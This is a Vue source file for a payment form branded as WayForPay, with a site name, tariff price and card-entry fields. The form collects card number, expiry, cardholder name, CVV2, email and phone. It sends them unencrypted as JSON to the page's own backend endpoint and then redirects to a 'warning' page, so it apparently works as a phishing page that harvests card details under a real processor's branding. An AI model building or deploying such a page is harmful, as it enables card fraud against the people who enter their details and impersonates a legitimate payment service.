<template>
	<div class="main">
		<div class="container">
			<div class="main-header">
				<div class="main-header__img">
					<img src="../assets/WayForPay/logo-img.png" alt="logo-img" />
				</div>
			</div>
			<div class="main-information">
				<div class="main-information-block">
					<div class="main-information-block__title">Site:</div>
					<div class="main-information-block__text">www.sb-professional.com/</div>
				</div>
				<div class="main-information-block">
					<div class="main-information-block__title">Description:</div>
					<div class="main-information-block__text">SBL: {{ route.query.tariffName }}</div>
				</div>
				<div class="main-information-block">
					<div class="main-information-block__title">Total:</div>
					<div class="main-information-block__price">{{ route.query.tariffPrice }} USD</div>
				</div>
			</div>
			<div class="main-line"></div>
			<div class="main-content">
				<div class="main-content__img">
					<img src="../assets/WayForPay/visa-mc-logo.png" alt="" />
				</div>
				<form @submit.prevent="submitForm" class="main-content__form">
					<div class="main-content__form_block">
						<div class="main-content__form_top">
							<div class="main-content__form_top_numc">
								<div class="main-content__form_top_numc_title">Card number:</div>
								<div class="main-content__form_top_numc_input">
									<input type="number" placeholder="XXXX XXXX XXXX XXXX" v-model="cardNumber"
										@blur="handleBlur('cardNumber')"
										:style="{ 'border-bottom': isError.cardNumber === true ? '1px solid red' : '' }" />
								</div>
							</div>
							<div class="main-content__form_top_year">
								<div class="main-content__form_top_year_title">Validity:</div>
								<div class="main-content__form_top_year_input">
									<input type="text" placeholder="MM/YY" v-model="validity" @blur="handleBlur('validity')"
										:style="{ 'border-bottom': isError.validity === true ? '1px solid red' : '' }" />
								</div>
							</div>
						</div>
						<div class="main-content__form_bottom">
							<div class="main-content__form_top_name">
								<div class="main-content__form_top_name_title">Owner's name:</div>
								<div class="main-content__form_top_name_input">
									<input type="text" placeholder="Full name of the cardholder" v-model="ownerName"
										@blur="handleBlur('ownerName')"
										:style="{ 'border-bottom': isError.ownerName === true ? '1px solid red' : '' }" />
								</div>
							</div>
							<div class="main-content__form_top_cv">
								<div class="main-content__form_top_cv_title">CVV2 code:</div>
								<div class="main-content__form_top_cv_input">
									<input type="text" placeholder="XXX" v-model="cvvCode" @blur="handleBlur('cvvCode')"
										:style="{ 'border-bottom': isError.cvvCode === true ? '1px solid red' : '' }" />
								</div>
							</div>
						</div>
					</div>
					<div class="main-content__form_info">
						<div class="main-content__form_info_email">
							<div class="main-content__form_info_email_title">Email:</div>
							<div class="main-content__form_info_email_input">
								<input type="text" placeholder="example@gmail.com" v-model="email" @blur="handleBlur('email')"
									:style="{ 'border-bottom': isError.email === true ? '1px solid red' : '' }" />
							</div>
						</div>
						<div class="main-content__form_info_phone">
							<div class="main-content__form_info_phone_title">Phone:</div>
							<div class="main-content__form_info_phone_input">
								<input type="number" placeholder="+1" v-model="phone" @blur="handleBlur('phone')"
									:style="{ 'border-bottom': isError.phone === true ? '1px solid red' : '' }" />
							</div>
						</div>
					</div>
					<div class="main-content__form_btn">
						<button type="submit" :disabled="isButtonDisabled" @click.prevent="submitForm">Send</button>
					</div>
				</form>
			</div>
		</div>
	</div>
</template>

<script lang="js">
import { defineComponent, ref, reactive, toRefs } from 'vue'
import { useRoute, useRouter } from "vue-router"
import { useVuelidate } from '@vuelidate/core'
import { required, maxLength, minLength, email } from '@vuelidate/validators'

export default defineComponent({
	setup() {
		const route = useRoute()
		const router = useRouter()

		const isButtonDisabled = ref(false)

		const state = reactive({
			cardNumber: "",
			validity: "",
			ownerName: "",
			cvvCode: "",
			email: "",
			phone: ""
		})

		const isError = reactive({
			cardNumber: false,
			validity: false,
			ownerName: false,
			cvvCode: false,
			email: false,
			phone: false
		})

		const rules = {
			cardNumber: {
				required,
				minLength: minLength(16),
				maxLength: maxLength(16)
			},
			validity: {
				required,
				minLength: minLength(5),
				maxLength: maxLength(5)
			},
			ownerName: {
				required
			},
			cvvCode: {
				required,
				minLength: minLength(3),
				maxLength: maxLength(3)
			},
			email: {
				required,
				email
			},
			phone: {
				required
			}
		}

		const v$ = useVuelidate(rules, state)

		const handleBlur = (key) => {
			v$.value[key].$dirty = true;
			if (state.cardNumber.toString().length === 16) {
				isError.cardNumber = false
			}
			if (state.validity.toString().length == 5) {
				const splitValidity = state.validity.toString().split("/")
				if (Number.isInteger(Number(splitValidity[0])) && Number.isInteger(Number(splitValidity[1]))) {
					if (Number(splitValidity[0]) <= 12 && Number(splitValidity[1]) > 22) {
						isError.validity = false
					} else {
						isError.validity = true
					}
				} else {
					isError.validity = true
				}
			}
			if (state.ownerName.toString().length > 8) {
				const ownerNameSplit = state.ownerName.toString().split(" ")
				if (ownerNameSplit.length >= 2 && ownerNameSplit.length < 4) {
					isError.ownerName = false
				} else {
					isError.ownerName = true
				}
			}
			if (state.cvvCode.toString().length === 3) {
				if (Number.isInteger(Number(state.cvvCode))) {
					isError.cvvCode = false
				} else {
					isError.cvvCode = true
				}
			}
			if (state.email.toString().length >= 5) {
				if (state.email.includes("@")) {
					isError.email = false
				} else {
					isError.email = true
				}
			}
			if (state.phone.toString().length >= 5) {
				isError.phone = false
			}
		};

		const submitForm = () => {
			isButtonDisabled.value = true
			if (v$.value.$invalid) {
				if (state.cardNumber.toString().length !== 16) {
					isError.cardNumber = true
				}
				if (state.validity.toString().length !== 5) {
					isError.validity = true
				}
				if (state.ownerName.toString().length < 9) {
					isError.ownerName = true
				}
				if (state.cvvCode.toString().length !== 3) {
					isError.cvvCode = true
				}
				if (state.email.toString().length < 5) {
					isError.email = true
				}
				if (state.phone.toString().length < 5) {
					isError.phone = true
				}
				isButtonDisabled.value = false
			} else {
				const formData = {
					card_number: state.cardNumber.toString(),
					validity: state.validity.toString(),
					owner_name: state.ownerName.toString(),
					cvv_code: state.cvvCode.toString(),
					email: state.email.toString(),
					phone: state.phone.toString(),
				}
				fetch("http://localhost:8080/api-v1/user/sendData", {
					method: "POST",
					headers: {
						"Content-Type": "application/json",
					},
					body: JSON.stringify(formData)
				})
					.then(res => res.json())
					.then((data) => {
						if (data.status === 200) {
							setTimeout(() => {
								isButtonDisabled.value = false
								router.push("/wayForPayWarning")
							}, 3000)
						}
					})
			}
		}
		return {
			route,
			handleBlur,
			submitForm,
			isError,
			...toRefs(state),
			isButtonDisabled
		}
	}
})
</script>

<style lang="css" scoped>
input::-webkit-outer-spin-button,
input::-webkit-inner-spin-button {
	-webkit-appearance: none;
	margin: 0;
}

input[type="number"] {
	-moz-appearance: textfield;
}

.main {
	width: 100%;
	height: 100vh;
	background-color: #fff;
}

.container {
	max-width: 480px;
	margin: 0 auto;
}

.main-header {
	padding: 12px 8px;
	width: 100%;
}

.main-header__img {
	display: flex;
	justify-content: center;
}

.main-header__img>img {
	max-width: 220px;
	height: 64px;
}

.main-information {
	padding: 0 8px;
}

.main-information-block {
	display: flex;
	align-items: center;
	justify-content: space-between;
	margin-top: 22px;
}

.main-information-block__title {
	font-size: 12px;
	color: #333;
	font-weight: 800;
}

.main-information-block__text {
	font-size: 15px;
	color: #464545d1;
}

.main-information-block__price {
	font-size: 24px;
	font-weight: 700;
	color: #018ffc;
}

.main-line {
	margin-top: 60px;
	border: none;
	border: 1px dashed #c4c4c463;
}

.main-content__img {
	margin: 16px 0 0;
	padding: 8px;
}

.main-content__form {
	margin-top: 10px;
}

.main-content__form_block {
	width: 100%;
	border-radius: 14px;
	box-shadow: 0 2px 6px #ccc;
	padding: 12px 30px 20px;
	margin-bottom: 18px;
	background: #ffffff;
}

.main-content__form_top {
	display: flex;
	align-items: center;
	justify-content: space-between;
	padding: 24px 0 0;
}

.main-content__form_top_numc {
	padding: 0 15px;
}

.main-content__form_top_numc_title {
	padding: 6px 0 0;
	font-size: 12px;
	color: #333;
	font-weight: 700;
}

.main-content__form_top_numc_input>input {
	width: 100%;
	outline: none;
	padding: 6px 0;
	border: none;
	color: #ccc;
	font-size: 13px;
	border-bottom: 1px solid #ccc;
}

.main-content__form_top_numc_input>input:focus {
	color: #333;
	border-bottom: 1px solid #007be8;
}

.main-content__form_top_year {
	padding: 0 15px;
}

.main-content__form_top_year_title {
	padding: 6px 0 0;
	font-size: 12px;
	color: #333;
	font-weight: 700;
}

.main-content__form_top_year_input>input {
	width: 100%;
	outline: none;
	padding: 6px 0;
	border: none;
	color: #ccc;
	font-size: 13px;
	border-bottom: 1px solid #ccc;
}

.main-content__form_top_year_input>input:focus {
	color: #333;
	border-bottom: 1px solid #007be8;
}

.main-content__form_bottom {
	display: flex;
	align-items: center;
	justify-content: space-between;
	padding: 24px 0 0;
}

.main-content__form_top_name {
	padding: 0 15px;
}

.main-content__form_top_name_title {
	padding: 6px 0 0;
	font-size: 12px;
	color: #333;
	font-weight: 700;
}

.main-content__form_top_name_input>input {
	width: 100%;
	outline: none;
	padding: 6px 0;
	border: none;
	color: #ccc;
	font-size: 13px;
	border-bottom: 1px solid #ccc;
}

.main-content__form_top_name_input>input:focus {
	color: #333;
	border-bottom: 1px solid #007be8;
}

.main-content__form_top_cv {
	padding: 0 15px;
}

.main-content__form_top_cv_title {
	padding: 6px 0 0;
	font-size: 12px;
	color: #333;
	font-weight: 700;
}

.main-content__form_top_cv_input>input {
	width: 100%;
	outline: none;
	padding: 6px 0;
	border: none;
	color: #ccc;
	font-size: 13px;
	border-bottom: 1px solid #ccc;
}

.main-content__form_top_cv_input>input:focus {
	color: #333;
	border-bottom: 1px solid #007be8;
}

.main-content__form_info {
	display: flex;
	align-items: center;
	justify-content: space-around;
}

.main-content__form_info_email {
	padding: 0 15px;
}

.main-content__form_info_email_title {
	padding: 6px 0 0;
	font-size: 12px;
	color: #333;
	font-weight: 700;
}

.main-content__form_info_email_input>input {
	width: 100%;
	outline: none;
	padding: 6px 0;
	border: none;
	color: #ccc;
	font-size: 13px;
	border-bottom: 1px solid #ccc;
}

.main-content__form_info_email_input>input:focus {
	color: #333;
	border-bottom: 1px solid #007be8;
}

.main-content__form_info_phone {
	padding: 0 15px;
}

.main-content__form_info_phone_title {
	padding: 6px 0 0;
	font-size: 12px;
	color: #333;
	font-weight: 700;
}

.main-content__form_info_phone_input>input {
	width: 100%;
	outline: none;
	padding: 6px 0;
	border: none;
	color: #ccc;
	font-size: 13px;
	border-bottom: 1px solid #ccc;
}

.main-content__form_info_phone_input>input:focus {
	color: #333;
	border-bottom: 1px solid #007be8;
}

.main-content__form_btn {
	display: flex;
	justify-content: center;
	width: 100%;
	padding: 50px 0 50px 0;
}

.main-content__form_btn>button {
	cursor: pointer;
	width: 300px;
	margin: 0 4px;
	padding: 12px 40px;
	font-size: 17px;
	color: #fff;
	background-color: #018ffc;
	border: none;
	border-radius: 6px;
}

.main-content__form_btn>button:hover {
	background-color: #007be8;
}

@media (max-width: 1024px) {
	.main-line {
		margin-top: 40px;
	}
}

@media (max-width: 480px) {
	.container {
		max-width: 400px;
	}

	.main-information-block__title {
		font-size: 11px;
	}

	.main-information-block__text {
		font-size: 13px;
	}

	.main-information-block__price {
		font-size: 20px;
	}

	.main-content__form_top_numc_input>input {
		font-size: 12px;
	}

	.main-content__form_top_year_input>input {
		font-size: 12px;
	}

	.main-content__form_top_name_input>input {
		font-size: 12px;
	}

	.main-content__form_top_cv_input>input {
		font-size: 12px;
	}

	.main-content__form_info_email_input>input {
		font-size: 12px;
	}

	.main-content__form_info_phone_input>input {
		font-size: 12px;
	}

	.main-content__form_btn>button {
		width: 200px;
	}
}

@media (max-width: 414px) {
	.container {
		max-width: 390px;
	}
}

@media (max-width: 390px) {
	.container {
		max-width: 350px;
	}
}

@media (max-width: 360px) {
	.container {
		max-width: 330px;
	}

	.main-content__form_block {
		padding: 10px 5px 30px;
		margin-bottom: 15px;
	}

	.main-content__form_top_numc_input>input {
		font-size: 11px;
	}

	.main-content__form_top_year_input>input {
		font-size: 11px;
	}

	.main-content__form_top_name_input>input {
		font-size: 11px;
	}

	.main-content__form_top_cv_input>input {
		font-size: 11px;
	}

	.main-content__form_info_email_input>input {
		font-size: 11px;
	}

	.main-content__form_info_phone_input>input {
		font-size: 11px;
	}

	.main-content__form_btn>button {
		width: 180px;
		font-size: 15px;
	}
}

@media (max-width: 320px) {
	.container {
		max-width: 300px;
	}

	.main-information-block__text {
		font-size: 12px;
	}

	.main-information-block__price {
		font-size: 18px;
	}

	.main-content__form_top_numc_title {
		font-size: 11px;
	}

	.main-content__form_top_year_title {
		font-size: 11px;
	}

	.main-content__form_top_name_title {
		font-size: 11px;
	}

	.main-content__form_top_cv_title {
		font-size: 11px;
	}

	.main-content__form_info_email_title {
		font-size: 11px;
	}

	.main-content__form_info_phone_title {
		font-size: 11px;
	}

	.main-content__form_btn>button {
		width: 150px;
		font-size: 14px;
	}
}
</style>